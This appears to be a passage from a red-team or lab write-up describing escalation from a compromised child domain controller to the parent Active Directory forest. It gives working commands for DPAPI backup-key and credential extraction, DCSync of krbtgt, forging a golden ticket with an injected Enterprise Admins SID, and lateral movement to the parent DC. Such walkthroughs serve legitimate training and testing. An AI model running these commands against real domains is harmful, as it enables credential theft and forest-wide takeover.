#### Trust To contoso.example

With privileged access on the child-domain DC `DUBLIN.contoso.example`, the goal shifts from thinking of the compromise as “just the child domain” to exploiting the trust relationship with the parent domain `contoso.example`.

At this stage the focus changes: rather than another local escalation, we are after cryptographic material and domain secrets that allow forging valid identities across the trust.

```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:
# TargetName : Domain:target=TERMSRV/dub-sql-1 
# Credential : 3mPLNMmoFfj!5kjc
```

Extracting the DPAPI Backup Key allows decryption of secrets protected at the domain level. In this case, reusable credentials associated with the environment are recovered.

```powershell
dcsync dublin.contoso.example DUBLIN\krbtgt
# aes256_hmac       (4096) : REDACTED_HASH
```

Once the DC is compromised, `DCSync` allows retrieval of the `krbtgt` cryptographic material, enabling the forgery of valid Kerberos tickets within the child domain.

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:DUBLIN.contoso.example /sid:S-1-5-21-2958544638-1589230383-838459903 /aes256:REDACTED_SECRET /sids:S-1-5-21-1076548718-1118529210-2193484809-519 /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:
```

The important point here is not only generating a Golden Ticket, but injecting an additional SID from the parent domain (`Enterprise Admins` from the root domain) to project privileges beyond the current domain.

```powershell
# renew
ls \\lon-dc-1\c$
jump scshell64 lon-dc-1 smb
```

- The trust abuse between `DUBLIN.contoso.example` and `contoso.example` is materialized
- Access to the parent domain DC `lon-dc-1` is obtained
- The compromise stops being local to the child domain and escalates to the forest
